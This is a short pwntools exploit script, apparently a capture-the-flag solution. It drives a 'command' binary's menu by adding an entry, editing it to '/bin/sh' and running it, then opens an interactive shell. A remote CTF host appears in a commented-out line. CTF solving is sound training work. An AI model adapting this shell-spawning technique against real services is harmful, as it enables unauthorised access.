from pwn import *

p = process('./command')
#p = remote('asia.pwn.zh3r0.ml', 8520)

def addcommand(command):
	print p.recvuntil('> ')
	p.sendline('1')
	print p.recvuntil('> ')
	p.sendline('command')

def editcommand(idx, command):
	print p.recvuntil('> ')
	p.sendline('3')
	print p.recvuntil('Enter index you want to edit: \n')
	p.sendline(str(idx))
	print p.recvuntil('Enter new command -> ')
	p.sendline(command)

def runcommand(idx):
	print p.recvuntil('> ')
	p.sendline('2')
	print p.recvuntil('Enter the index of the command: ')
	p.sendline(str(idx))

print p.recvuntil('name: ')
p.sendline('my name')

addcommand('ppp')
editcommand(0, '/bin/sh')
runcommand(0)

p.interactive()
